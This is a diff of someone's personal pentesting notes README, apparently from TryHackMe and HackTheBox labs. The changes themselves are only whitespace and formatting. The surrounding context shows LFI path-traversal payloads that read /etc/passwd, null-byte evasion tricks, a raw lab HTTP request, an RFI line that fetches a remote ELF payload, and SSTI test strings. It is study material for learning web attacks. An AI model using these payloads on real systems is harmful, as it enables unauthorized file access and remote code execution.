@@ -5,6 +5,7 @@
  <script src="https://tryhackme.com/badge/1210884"></script>
 
 <details>
+
 <summary>My Reading List & Resources </summary>
 
 * Linux Basics for Hackers Getting Started with Networking, Scripting, and Security in Kali (OccupyTheWeb)
@@ -18,6 +19,7 @@
 * Hacktricks.xyz
 * picoctf.org -> https://play.picoctf.org/users/jeremylaratro
 * LeetCode -> https://leetcode.com/jeremylaratro/
+
 </details>
 
 
@@ -25,8 +27,13 @@
 >Overview, Tools, and Pathways
 Many tools exist for various different purposes when testing and exploiting systems. The tools necessary for to exploit any machine will vary but in most cases, begin in a similar fashion which is enumeration and reconnaissance. 
 The following tools are ones which I have used for challenges, machines, and CTFs.
-<details><summary>
+
+<details>
+
+<summary>
+
 General Enumeration | Scanning | Reconnaissance
+
 </summary>
 
 >>#### whatweb
@@ -100,11 +107,15 @@ to improve my understanding of PHP and common web frameworks in order to be able
 </details>
 
 ----------
+
 > Notes from labs, CTF's, and machine's on HackTheBox, TryHackMe, OWASP Juice Shop, etc.
+
 <details>
 
 <summary>
+
 Local File Inclusion and Remote File Inclusion Overview 
+
 </summary>
 
 ># LFI
@@ -116,26 +127,31 @@ traverse the file system due to improperly or non-sanitized requests.
 This may allow an attacker to access sensitive files, ie /etc/passwd
 
 Commonly used attack vector for LFI is '/../../'
+
 ````
 get.php?file=../../../../etc/passwd
 ````
 
 This allows traversal through layers of the directories to the root or target folder/directory. How many times depends on the specific system.
 This can be determined by encouraging an error, ie:
+
 ````
  index.php?lang=jfbdsgd
  ````
  which then may return an error containing something along the lines of:
+
 ````
 '..
  in /var/www/html/lab2.php on line 26'
  ````
  
  The presence of 4 layers can be derived from this, and thus, 4 levels can be used for the attack:
+
  ```
  index.php?lang=../../../../etc/passwd
  ```
  OS info can be derived as well:
+
 ```
  /get.php?file=../../../../boot.ini
  /get.php?file=../../../../windows/win.ini
@@ -147,17 +163,21 @@ This can be determined by encouraging an error, ie:
  index.php?lang=../../../../etc/passwd%00
  
  Using a '.' can also be used to signify staying within the directory
+
 ````
  ../../../../etc/passwd/.
  ````
  Forced directory - if developer forces a directory, evasion is possible by understanding where that directory lies within the levels.
  Evasion may be as simple as adding an extra layer, ie:
+
 ````
  /../../../etc/passwd  --> /../../../../etc/passwd
  ````
+
  Burp suite can be used to evade any request filters that may filter or change characters
 Try POST, GET 
 If _REQUEST is being used, take advantage of cookies: 
+
 ````
 POST /challenges////////////chall3.php HTTP/1.1
 Host: 10.10.120.210
@@ -174,7 +194,9 @@ Content-Length: 25
 
 file=../../../etc/flag3%00
 ```` 
+
 --------------------------
+
 ># RFI
  
 RFI is similar to LFI but involves remote inclusion of files and potentially RCE. It depends on the function:
@@ -182,26 +204,33 @@ allow_url_fopen
 
 Overview:
 Payload is hosted on attackers servers -> payload injected via HTTP requests using include function -> payload is executed
+
 ````
 GET /page.php?file=
 lang=http://0.0.0.0/r.elf
 ````
+
 ````
 O:8:"_construct":1:{s:4:"cookie";s:10:"Some data!";} 
 ````
+
 Tools:
+
 ````
 - lfimap
 - lfitester
 - vailyn
 ````
+
 </details> 
 
 <details>
+
 <summary>Server-Side Template Injection - SSTI</summary>
 Notes from SSTI Lab on TryHackMe.
 
 Common test-cases:
+
 ````
 {7*7}
 {{7*7}}'
@@ -254,7 +283,9 @@ Tools:
 ````
 
 </details>
+
 <details>
+
 <summary>SMB Exploitation</summary>
 SMB- server message block
 * Notes from TryHackMe's SMB room
@@ -377,7 +408,7 @@ Within an image:
 	
 Tools:
 	
-~~~
+````
 	
 - xsshunter
 - xsssniper
@@ -385,5 +416,6 @@ Tools:
 - garud
 - 0d1n
 ````
+
 </details>
 
